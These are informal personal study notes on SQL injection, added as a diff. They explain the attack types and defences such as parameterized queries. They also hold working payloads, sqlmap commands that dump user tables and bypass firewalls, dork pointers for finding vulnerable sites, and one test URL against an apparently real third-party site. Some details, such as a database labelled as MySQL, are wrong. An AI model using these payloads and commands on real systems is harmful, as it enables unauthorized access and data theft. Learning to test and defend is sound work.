@@ -50,3 +50,252 @@ Out-of-band SQL injection occurs when attacker is unable to use the same channel
 
 
 
+if we get the error invalid username or password so this is we call non-verbal generic error message and it is good but if it said a username is invalid then the attacker only enmerate for the username and it is vulnerability
+
+SELECT firstname FROM users where userename=''admin' and password='admin'
+
+
+SELECT firstname FROM users where userename='admin'---' and password='admin'
+
+
+
+
+
+Goal ⇒ retrive  database type and version
+on ⇒ MySQL and Microsoft
+
+mysql ⇒ SELECT banner FROM v$version
+microsoft ⇒ SELECT @@version
+mqsql ⇒ SELECT @@version
+
+category=gift' UNION select banner FROM v$version--
+
+' UNION select NULL --
+
+' UNION SELECT @@version--
+' UNION SELECT @@version--
+
+
+gauri tool ⇒ sql injection
+
+
+
+
+======================================================================================================================================
+
+
+SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. It typically occurs when user input is improperly sanitized and directly included in an SQL query. SQLi can allow attackers to view, modify, or delete data, bypass authentication, and, in severe cases, execute administrative operations on the database.
+
+How SQL Injection Works
+SQL Injection happens when an attacker is able to input arbitrary SQL code into a query. A typical SQL query looks like this:
+sql
+
+SELECT * FROM users WHERE username = 'user_input' AND password = 'password';
+
+If the user_input isn't properly sanitized, an attacker might enter something like this:
+
+bash
+
+' OR '1'='1
+
+The resulting SQL query would then look like:
+
+sql
+
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'password';
+
+In this case, the condition '1'='1' is always true, which could grant unauthorized access.
+Types of SQL Injection
+
+    In-band SQL Injection:
+        The attacker uses the same communication channel to both launch the attack and collect the results.
+        Example: Injecting malicious SQL into a vulnerable input field and receiving the database's response via the web application's output.
+        Subtypes:
+            Error-based SQLi: Relying on database error messages to extract information.
+            Union-based SQLi: Using UNION SQL queries to retrieve data from other tables.
+
+    Blind SQL Injection:
+        The attacker doesn't see the output of the attack, making it more difficult but still possible to gather data.
+        Subtypes:
+            Boolean-based Blind SQLi: The application behaves differently based on a true or false query result, helping attackers deduce information.
+            Time-based Blind SQLi: The application is forced to delay its response, allowing attackers to infer information based on the time taken for responses.
+
+    Out-of-band SQL Injection:
+        Attackers exploit the vulnerability but use a different channel to retrieve the results, such as HTTP requests or DNS queries.
+        Common SQLi Payloads
+
+    Authentication Bypass:
+
+    sql
+
+' OR '1'='1';
+
+Extracting Data:
+
+sql
+
+' UNION SELECT username, password FROM users -- ;
+
+Commenting Out Code:
+
+sql
+
+' OR 1=1 -- ;
+
+Time Delay (Blind SQLi):
+
+sql
+
+    ' OR IF(1=1, SLEEP(5), 0) -- ;
+
+Impact of SQL Injection
+
+SQL Injection can lead to severe consequences, such as:
+
+    Unauthorized Data Access: Attackers can read sensitive data, including personal information, financial records, and login credentials.
+    Data Modification: Attackers can insert, update, or delete records, which can cause data integrity issues.
+    Authentication Bypass: Attackers can log in as another user without knowing their password.
+    Remote Code Execution (RCE): In some cases, attackers can execute commands on the underlying server.
+    Denial of Service (DoS): SQL Injection can also lead to database corruption, making the application unusable.
+
+Preventing SQL Injection
+
+    Parameterized Queries/Prepared Statements: Use parameterized queries, which separate SQL logic from data, preventing user input from being interpreted as part of the SQL command:
+
+    python
+
+    cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
+
+    Stored Procedures: Encapsulate the SQL logic in stored procedures that don't expose the SQL query directly to user inputs.
+
+    Input Validation: Sanitize user inputs to ensure only expected values are allowed.
+
+    Escaping Inputs: Escape special characters (e.g., --, ', ;) in SQL queries if dynamic SQL is absolutely necessary.
+
+    Database Privilege Management: Ensure that the database account used by the web application has the minimum necessary privileges.
+
+    Web Application Firewalls (WAF): Deploy a WAF to detect and block common SQL injection attacks.
+
+    Regular Security Audits: Perform regular security audits, including code reviews and penetration testing, to detect and fix vulnerabilities early.
+
+Testing for SQL Injection
+
+    Manual Testing: Try inserting SQL special characters like ', ", -- in inputs to observe how the application responds.
+    Automated Tools:
+        sqlmap: A popular open-source tool that automates the process of detecting and exploiting SQL Injection.
+        Burp Suite: A comprehensive tool used for web security testing, including SQL Injection.
+
+SQL Injection remains one of the most critical and widely-exploited vulnerabilities in web applications. Proper input validation, secure coding practices, and regular security assessments can greatly reduce the risk of SQLi.
+
+
+
+
+Tools
+SQL MAP
+jsql injection
+BBQSQL
+SQL Ninja
+
+Where to Check
+URL
+Input Boxes
+Requests and Responses
+Hidden input boxes
+
+
+
+Sqlmap
+sqlmap -u testphp.vulnweb.com --crawl 3 --batch --technique="U"
+--crawl ⇒ crawl page
+--batch ⇒ select the default options like it, sqlmap ask y/N then it will choose N by default making it easier
+--technique="B"
+--threads 5 ⇒ run 5 connections at once
+--risk 1 ⇒ by default 1, it is defined as the risky payloads that will be send, total 3 risk are there (can change the database too, so use it carefully)
+--level 1 ⇒ by default 1, it will search in detail like user agents, header, 5 is max, can give false positivies too.
+-v 4 ⇒ 0-6 verbosity
+--output-dir="/path" ⇒ save data in a file
+--header="Referer:abc.com" ⇒ adds user defined headers
+--user-agent="GECKO_Chrome" ⇒ adds custom user-agents
+sqlmap -u testphp.vulnweb.com --crawl 3 --mobile -v 4 ⇒ sqlmap gives some user-agents i have to use --mobile for it and it will let me choose the user-agent, it helps to bypass firewalls like things
+
+
+sqlmap-list-tampers ⇒ used to bypass firewalls
+sqlmap -u testphp.vulnweb.com --crawl 3 --tamper=base64encode --batch ⇒ using base64encoding method
+
+
+B ⇒ Boolean-based blind
+E ⇒ Error-based
+U ⇒ Union query based
+S ⇒ Stacked queries
+T ⇒ Time-based
+Q ⇒ inline queries
+
+enumeration
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --current-user --current-db --hostname --batch
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs --table ⇒ --dbs fetech database info and --table fetch table data
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables ⇒ -D database_name
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --dump --batch ⇒ get all the infromation related to users table along with username password email
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --columns --batch ⇒ columns give information about a table like cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100)
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --dump-all ⇒ dump all the found table's data
+
+
+
+
+If we find a login page then what should we do to find out if there is sql injection or not
+sqlmap -u http://testphp.vulnweb.com/login.php --forms
+sqlmap -u http://testphp.vulnweb.com/userinfo.php --data="uname=abc&pass=123&login=submit" -dbs --batch
+
+Proxy and use of burpsuite on it
+sqlmap -u http://testphp.vulnweb.com/ --crawl 3 --proxy="http://127.0.0.1:4444" --batch
+
+sqlmap -r burpsuiterequested.txt --batch
+
+
+
+
+
+Dorks to find particular Sql injection available sites
+Just search “google dork for sql injection”
+https://www.boxpiper.com/posts/google-dork-list-sql-injection
+
+sql injection vulnerability checkers
+‘ “ / \ ’ ‘) ’)) ”)
+
+ --+
+http://www.optolumin.com/prod.php?id=951%20--+
+
+
+sql injection payloads
+https://github.com/payloadbox/sql-injection-payload-list
+
+
+sqli injection lab setup
+cd /var/www/html
+sudo git clone https://github.com/Audi-1/sqli-labs.git
+sudo systemctl start apache2
+http://localhost/sqli-labs/
+⇒ unfortunately it is not working
+
+
+
+
+PortSwigger
+1
+‘or’'=''--
+SELECT * FROM products WHERE category = 'Gifts ' AND released = 1
+
+-- ⇒ comment
+' or 1=1--
+
+1’ OR 1=1--
+
+first check for quote character or the double quote chracter like ‘
+
+======================================================================================================================================
+
+
+
+
+
